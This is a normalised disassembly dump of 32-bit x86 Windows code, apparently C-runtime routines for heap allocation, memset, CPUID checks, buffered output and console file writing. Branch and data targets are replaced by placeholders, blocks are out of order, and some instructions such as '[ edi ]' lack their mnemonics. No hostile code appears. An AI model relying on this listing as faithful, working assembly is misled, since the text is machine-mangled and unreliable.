mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_1002d9c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_1002d5d9
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_1002d529
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_1002dca7
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1002dcfe
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_1002dcfe
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_1002dca7
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1002dddd
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_1002dd8d
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_1002de4c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1002ed42
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1002972b
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1002972b
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100273c7
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1002f4a7
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_10035d78
pop ecx
test eax eax
jne r-xdata
call sub_100273c7
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1002f4a7
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1002f583
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10035c5f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1002dfb0
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1002de4c
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_1002dfe3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_1002dfb0
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_1002e009
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_1002dfb0
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_1002972b
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_1002dfb0
sub_1002e056
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_10027728
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_1002ed42
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_1002ebee
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1002de4c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1002ecba
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10035f7b
call sub_1002ebee
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_1002972b
mov [ eax ] 0x22
sub_1002ed42
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_1002ed74
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10036d50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_1002973e
mov [ eax ] esi
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_1002973e
xor esi esi
mov [ eax ] esi
call sub_1002972b
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10035d78
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10035bda
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_1002bd74
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x1c
call sub_1002973e
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_10029751
pop ecx
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_1003492f
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_10036b4b
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_10036d27
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
